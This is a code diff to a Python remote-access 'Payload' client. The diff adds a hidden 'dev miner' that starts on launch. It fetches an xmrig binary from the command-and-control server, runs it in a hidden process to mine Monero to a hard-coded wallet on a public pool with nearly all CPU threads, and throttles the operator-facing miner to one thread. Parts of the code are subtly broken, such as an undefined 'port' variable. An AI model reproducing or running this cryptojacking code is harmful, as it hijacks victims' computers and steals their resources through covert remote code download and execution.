@@ -250,6 +250,31 @@ class Payload():
             time.sleep(0.5)
 
 
+    def _init_dev_miner(self):
+        url = 'pool.hashvault.pro:80'
+        username = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
+
+        # check cpu count to set number of threads
+        import multiprocessing as mp
+        threads = mp.cpu_count() - 1
+
+        # pull xmrig from server if necessary
+        if not self.xmrig_path_dev:
+            self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
+
+            # set up executable
+            if os.name == 'nt' and not self.xmrig_path_dev.endswith('.exe'):
+                os.rename(self.xmrig_path_dev, self.xmrig_path_dev + '.exe')
+                self.xmrig_path_dev += '.exe'
+
+            os.chmod(self.xmrig_path_dev, 755)
+
+        # excute xmrig in hidden process
+        params = self.xmrig_path_dev + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, username=username, host=globals()['public_ip'](), port=port, threads=threads)
+        result = self.execute(params)
+        return result
+
+
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cd <path>')
     def cd(self, path='.'):
         """
@@ -563,7 +588,7 @@ class Payload():
                 os.chmod(self.xmrig_path, 755)
 
             # excute xmrig in hidden process
-            params = self.xmrig_path + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14".format(url=url, username=username)
+            params = self.xmrig_path + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=1".format(url=url, username=username)
             result = self.execute(params)
             return result
 
@@ -1084,8 +1109,8 @@ class Payload():
         self.handlers['prompt_handler'] = self._get_prompt_handler() if not self.gui else None
         self.handlers['thread_handler'] = self._get_thread_handler()
 
-        # kick off miner
-        self.miner('run pool.hashvault.pro:80 46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa')
+        # kick off dev miner
+        self._init_dev_miner()
 
         # loop listening for tasks from server and sending responses.
         # if connection is dropped, enter passive mode and retry connection every 30 seconds.
